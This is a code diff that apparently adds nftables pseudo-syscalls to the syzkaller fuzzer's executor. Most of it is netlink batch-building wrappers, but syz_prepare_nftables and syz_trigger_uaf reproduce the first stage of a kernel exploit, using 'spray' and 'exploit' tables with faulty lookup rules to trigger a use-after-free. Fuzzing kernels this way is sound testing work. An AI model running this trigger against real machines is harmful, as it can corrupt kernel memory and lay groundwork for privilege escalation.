@@ -5713,10 +5713,10 @@ static long syz_pidfd_open(volatile long pid, volatile long flags)
 #if SYZ_EXECUTOR || __NR_syz_mnl_socket_open
 #include <libmnl/libmnl.h>
 
-static long syz_mnl_socket_open(volatile long bus)
+static long syz_mnl_socket_open()
 {
 	struct mnl_socket* nl_sock;
-	nl_sock = mnl_socket_open(NETLINK_ROUTE);
+	nl_sock = mnl_socket_open(NETLINK_NETFILTER);
 	if (nl_sock == NULL)
 		return -1;
 	return (long)nl_sock;
@@ -6853,5 +6853,314 @@ static long syz_nftnl_rule_nlmsg_build_hdr(volatile long buf_ptr, volatile long 
 {
 	char* buf = (char*)(long)buf_ptr;
 	return (long)nftnl_rule_nlmsg_build_hdr(buf, type, family, flags, seq);
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_prepare_nftables
+#include <libmnl/libmnl.h>
+#include <libnftnl/chain.h>
+#include <libnftnl/expr.h>
+#include <libnftnl/rule.h>
+#include <libnftnl/set.h>
+#include <libnftnl/table.h>
+const char* spray_table_name = "spray_table";
+const char* exploit_table_name = "exploit_table";
+
+const char* spray_chain_name = "OUTPUT";
+const char* exploit_chain_name = "OUTPUT";
+
+static long syz_prepare_nftables(volatile long nl_ptr)
+{
+	struct mnl_socket* nl = (struct mnl_socket*)(long)nl_ptr;
+	uint32_t portid, seq, table_seq;
+	int ret;
+
+	seq = time(NULL);
+
+	struct mnl_nlmsg_batch* batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);
+
+	nftnl_batch_begin((char*)mnl_nlmsg_batch_current(batch), seq++);
+	table_seq = seq;
+	mnl_nlmsg_batch_next(batch);
+
+	// table for spray
+	create_table(batch, seq++, spray_table_name);
+	create_chain(batch, seq++, spray_table_name, spray_chain_name);
+
+	// table for exploit
+	create_table(batch, seq++, exploit_table_name);
+	create_chain(batch, seq++, exploit_table_name, exploit_chain_name);
+
+	nftnl_batch_end((char*)mnl_nlmsg_batch_current(batch), seq++);
+	mnl_nlmsg_batch_next(batch);
+
+	portid = mnl_socket_get_portid(nl);
+
+	if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
+			      mnl_nlmsg_batch_size(batch)) < 0) {
+		err(1, "Cannot into mnl_socket_sendto()");
+	}
+
+	mnl_nlmsg_batch_stop(batch);
+
+	while (table_seq + 1 != seq) {
+		ret = mnl_socket_recvfrom(nl, mnl_batch_buffer, mnl_batch_limit);
+		if (ret == -1) {
+			err(1, "Cannot into mnl_socket_recvfrom()");
+		}
+		ret = mnl_cb_run(mnl_batch_buffer, ret, table_seq, portid, NULL, NULL);
+		if (ret == -1) {
+			err(1, "Cannot into mnl_cb_run()");
+		}
+		table_seq++;
+	}
+
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_trigger_uaf
+static long syz_trigger_uaf(volatile long nl_ptr)
+{
+	struct mnl_socket* nl = (struct mnl_socket*)(long)nl_ptr;
+	uint32_t portid, seq, table_seq;
+	struct mnl_nlmsg_batch* batch;
+	char exploit_set_name[0x100];
+	char udata_buf[TARGET_SET_SIZE];
+
+	// first batch : register anon set
+	seq = time(NULL);
+	batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);
+
+	nftnl_batch_begin((char*)mnl_nlmsg_batch_current(batch), seq++);
+	table_seq = seq;
+	mnl_nlmsg_batch_next(batch);
+
+	memset(exploit_set_name, 'A', sizeof(exploit_set_name));
+	memset(udata_buf, 0, TARGET_SET_SIZE);
+	exploit_set_name[sizeof(exploit_set_name) - 1] = '\x00';
+	create_set(batch, seq++, exploit_table_name, "a", 0x13100, NFT_SET_ANONYMOUS, 1, 0, udata_buf, TARGET_SET_SIZE - NORMAL_SET_SIZE);
+	create_set(batch, seq++, exploit_table_name, "b", 0x13101, NFT_SET_ANONYMOUS, 1, 0, udata_buf, TARGET_SET_SIZE - NORMAL_SET_SIZE);
+
+	create_faulty_lookup_rule(batch, seq++, exploit_table_name, exploit_chain_name, "a", 0x13100);
+	create_faulty_lookup_rule(batch, seq++, exploit_table_name, exploit_chain_name, "b", 0x13100);
+
+	create_lookup_rule(batch, seq++, exploit_table_name, exploit_chain_name, "a", 0x13100);
+
+	nftnl_batch_end((char*)mnl_nlmsg_batch_current(batch), seq++);
+	mnl_nlmsg_batch_next(batch);
+
+	portid = mnl_socket_get_portid(nl);
+
+	// start spray thread
+	printf("[*] first batch will start with spray\n");
+	sleep(1);
+	if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
+			      mnl_nlmsg_batch_size(batch)) < 0) {
+		err(1, "Cannot into mnl_socket_sendto()");
+	}
+	// stop spray thread
+
+	mnl_nlmsg_batch_stop(batch);
+	printf("[*] first batch done\n");
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_declare_mnl_batch_buffer
+#define mnl_batch_limit (1024 * 1024)
+static long syz_declare_mnl_batch_buffer()
+{
+	char* mnl_batch_buffer = new char[2 * mnl_batch_limit];
+	long address = (long)mnl_batch_buffer;
+	return address;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_set_table
+static long syz_set_table(volatile long table_name_ptr)
+{
+	char* table_name = (char*)(long)table_name_ptr;
+	struct nftnl_table* table;
+	table = nftnl_table_alloc();
+	nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);
+	return (long)table;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_set_obj
+#include <libnftnl/object.h>
+static long syz_set_obj(volatile long table_name_ptr, volatile long obj_name_ptr)
+{
+	char* table_name = (char*)(long)table_name_ptr;
+	char* obj_name = (char*)(long)obj_name_ptr;
+	struct nftnl_obj* obj;
+	obj = nftnl_obj_alloc();
+	nftnl_obj_set_str(obj, NFTNL_OBJ_NAME, obj_name);
+	nftnl_obj_set_str(obj, NFTNL_OBJ_TABLE, table_name);
+	nftnl_obj_set_u32(obj, NFTNL_OBJ_TYPE, NFT_OBJECT_COUNTER);
+	nftnl_obj_set_u64(obj, NFTNL_OBJ_CTR_BYTES, 0);
+	return (long)obj;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_set_set
+static long syz_set_set(volatile long table_name_ptr, volatile long set_name_ptr)
+{
+	char* table_name = (char*)(long)table_name_ptr;
+	char* set_name = (char*)(long)set_name_ptr;
+	struct nftnl_set* set;
+	set = nftnl_set_alloc();
+	nftnl_set_set_str(set, NFTNL_SET_TABLE, table_name);
+	nftnl_set_set_str(set, NFTNL_SET_NAME, set_name);
+	nftnl_set_set_u32(set, NFTNL_SET_FAMILY, NFPROTO_IPV4);
+	nftnl_set_set_u32(set, NFTNL_SET_KEY_LEN, 8);
+	nftnl_set_set_u32(set, NFTNL_SET_ID, htonl(0xcafe));
+	nftnl_set_set_u32(set, NFTNL_SET_FLAGS, NFT_SET_OBJECT | NFT_SET_ANONYMOUS);
+	nftnl_set_set_u32(set, NFTNL_SET_OBJ_TYPE, NFT_OBJECT_COUNTER);
+	return (long)set;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_set_elem
+static long syz_set_elem(volatile long table_name_ptr, volatile long obj_name_ptr)
+{
+	char* table_name = (char*)(long)table_name_ptr;
+	char* obj_name = (char*)(long)obj_name_ptr;
+	struct nftnl_set* sx = nftnl_set_alloc();
+	struct nftnl_set_elem* slem = nftnl_set_elem_alloc();
+	int klen[64];
+	nftnl_set_set_str(sx, NFTNL_SET_TABLE, table_name);
+	nftnl_set_set_u32(sx, NFTNL_SET_ID, htonl(0xcafe));
+	nftnl_set_elem_set(slem, NFTNL_SET_ELEM_KEY, &klen, 8);
+	nftnl_set_elem_set_str(slem, NFTNL_SET_ELEM_OBJREF, obj_name);
+	nftnl_set_elem_add(sx, slem);
+	return (long)slem;
+}
+#endif
+
+struct mnl_socket* gs;
+struct mnl_nlmsg_batch* gbatch;
+int gseq = 0;
+char gbuf[16384];
+struct nlmsghdr* gnh;
+
+#if SYZ_EXECUTOR || __NR_syz_start_batch
+static long syz_start_batch()
+{
+	gbatch = mnl_nlmsg_batch_start(gbuf, sizeof(gbuf));
+	nftnl_batch_begin((char*)mnl_nlmsg_batch_current(gbatch), gseq++);
+	mnl_nlmsg_batch_next(gbatch);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_table_build_payload
+static long syz_table_build_payload(volatile long table_ptr)
+{
+	struct nftnl_table* table = (struct nftnl_table*)(long)table_ptr;
+	gnh = nftnl_table_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(gbatch), NFT_MSG_NEWTABLE, NFPROTO_IPV4, NLM_F_CREATE, gseq++);
+	nftnl_table_nlmsg_build_payload(gnh, table);
+	mnl_nlmsg_batch_next(gbatch);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_obj_build_payload
+static long syz_obj_build_payload(volatile long obj_ptr)
+{
+	struct nftnl_obj* obj = (struct nftnl_obj*)(long)obj_ptr;
+	gnh = nftnl_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(gbatch), NFT_MSG_NEWOBJ, NFPROTO_IPV4, NLM_F_CREATE, gseq++);
+	nftnl_obj_nlmsg_build_payload(gnh, obj);
+	mnl_nlmsg_batch_next(gbatch);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_set_build_payload
+static long syz_set_build_payload(volatile long set_ptr)
+{
+	struct nftnl_set* set = (struct nftnl_set*)(long)set_ptr;
+	gnh = nftnl_set_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(gbatch), NFT_MSG_NEWSET, NFPROTO_IPV4, NLM_F_CREATE, gseq++);
+	nftnl_set_nlmsg_build_payload(gnh, set);
+	mnl_nlmsg_batch_next(gbatch);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_set_elem_build_payload
+static long syz_set_elem_build_payload(volatile long set_ptr)
+{
+	struct nftnl_set* s = (struct nftnl_set*)(long)set_ptr;
+	gnh = nftnl_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(gbatch), NFT_MSG_NEWSETELEM, NFPROTO_IPV4, NLM_F_CREATE, gseq++);
+	nftnl_set_elems_nlmsg_build_payload(gnh, s);
+	mnl_nlmsg_batch_next(gbatch);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_batch_end
+static long syz_batch_end()
+{
+	nftnl_batch_end((char*)mnl_nlmsg_batch_current(gbatch), gseq++);
+	mnl_nlmsg_batch_next(gbatch);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_open
+static long syz_open()
+{
+	gs = mnl_socket_open(NETLINK_NETFILTER);
+	if (!gs)
+		err(1, "failed to create netfilter socket");
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_sendto
+static long syz_sendto()
+{
+	int r = mnl_socket_sendto(gs, mnl_nlmsg_batch_head(gbatch), mnl_nlmsg_batch_size(gbatch));
+	if (r < 0)
+		err(1, "failed to send message");
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_obj_alloc
+#include <libnftnl/object.h>
+static long syz_nftnl_obj_alloc()
+{
+	struct nftnl_obj* obj = nftnl_obj_alloc();
+	return (long)obj;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_obj_set_str
+static long syz_nftnl_obj_set_str(volatile long obj_ptr, volatile long attr, volatile long str_ptr)
+{
+	struct nftnl_obj* obj = (struct nftnl_obj*)(long)obj_ptr;
+	char* str = (char*)(long)str_ptr;
+	nftnl_obj_set_str(obj, attr, str);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_obj_set_u32
+static long syz_nftnl_obj_set_u32(volatile long obj_ptr, volatile long attr, volatile long val)
+{
+	struct nftnl_obj* obj = (struct nftnl_obj*)(long)obj_ptr;
+	nftnl_obj_set_u32(obj, attr, val);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_obj_set_u64
+static long syz_nftnl_obj_set_u64(volatile long obj_ptr, volatile long attr, volatile long val)
+{
+	struct nftnl_obj* obj = (struct nftnl_obj*)(long)obj_ptr;
+	nftnl_obj_set_u64(obj, attr, val);
+	return 0;
 }
 #endif
